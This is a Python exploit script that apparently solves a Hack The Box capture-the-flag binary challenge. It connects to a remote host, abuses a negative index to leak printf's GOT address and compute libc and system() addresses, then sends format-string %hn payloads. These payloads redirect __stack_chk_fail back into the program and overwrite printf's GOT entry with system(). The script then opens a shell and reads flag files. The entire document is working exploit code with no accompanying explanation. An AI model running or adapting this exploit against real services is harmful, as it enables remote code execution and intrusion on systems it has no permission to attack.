#!/usr/bin/env python3
import socket
import struct
import time

HOST, PORT = "154.57.164.82", 32710
PRINTF_GOT = 0x602030
STACK_CHK_FAIL_GOT = 0x602028
OPERATION = 0x400ACA
PRINTF_OFF = 0x61C90
SYSTEM_OFF = 0x52290

p64 = lambda x: struct.pack("<Q", x)


def recvuntil(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(data)
        data += chunk
    return data


def fmt16(writes, prefix=b"", pad_to=80):
    """Build positional %hn writes, with appended pointers starting at arg 8."""
    first_arg = 8 + pad_to // 8
    ordered = sorted(enumerate(writes), key=lambda item: item[1][1])
    out = bytearray(prefix)
    count = len(prefix)
    for original_index, (_, value) in ordered:
        delta = (value - count) & 0xFFFF
        if delta:
            # Keep every conversion positional; mixing positional and ordinary
            # conversions is undefined and crashes this older glibc build.
            out += f"%8${delta}c".encode()
            count += delta
        out += f"%{first_arg + original_index}$hn".encode()
    if len(out) > pad_to:
        raise ValueError(f"format section too long: {len(out)} > {pad_to}")
    out += b"A" * (pad_to - len(out))
    out += b"".join(p64(address) for address, _ in writes)
    if len(out) > 105:
        raise ValueError(f"payload too long: {len(out)}")
    return bytes(out)


def main():
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        recvuntil(s, b"Select a R0bob1rd > ")

        # Index -14 makes the program print the raw resolved printf GOT entry.
        s.sendall(b"-14\n")
        leak_block = recvuntil(s, b"> ")
        leak = leak_block.split(b"You've chosen: ", 1)[1].split(b"\n", 1)[0]
        printf_addr = int.from_bytes(leak.ljust(8, b"\0"), "little")
        libc_base = printf_addr - PRINTF_OFF
        system = libc_base + SYSTEM_OFF
        print(f"[+] printf: {printf_addr:#x}")
        print(f"[+] libc:   {libc_base:#x}")
        print(f"[+] system: {system:#x}")

        # A 104-byte payload makes fgets replace the canary's leading NUL. First
        # redirect the resulting __stack_chk_fail call back into operation().
        loop_writes = [
            (STACK_CHK_FAIL_GOT, OPERATION & 0xFFFF),
            (STACK_CHK_FAIL_GOT + 2, (OPERATION >> 16) & 0xFFFF),
            (STACK_CHK_FAIL_GOT + 4, (OPERATION >> 32) & 0xFFFF),
        ]
        payload = fmt16(loop_writes, pad_to=80)
        assert len(payload) == 104
        s.sendall(payload + b"\n")
        recvuntil(s, b"Select a R0bob1rd > ")
        s.sendall(b"0\n")
        recvuntil(s, b"> ")

        # On the recursive pass, change printf to system and corrupt the canary
        # again. The failure invokes operation once more, now with printf calls
        # dispatched through system.
        system_writes = [
            (PRINTF_GOT, system & 0xFFFF),
            (PRINTF_GOT + 2, (system >> 16) & 0xFFFF),
            (PRINTF_GOT + 4, (system >> 32) & 0xFFFF),
        ]
        payload = fmt16(system_writes, pad_to=80)
        assert len(payload) == 104
        s.sendall(payload + b"\n")
        time.sleep(0.5)
        s.sendall(b"0\nsh\n")
        time.sleep(2.5)
        s.sendall(b"cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit\n")

        out = b""
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        text = out.decode("latin-1", errors="replace")
        flags = __import__("re").findall(r"HTB\{[^}]+\}", text)
        if flags:
            print("[+] flag:", flags[-1])
        else:
            print(f"[-] no flag; received {len(out)} bytes; tail={out[-500:]!r}")


if __name__ == "__main__":
    main()
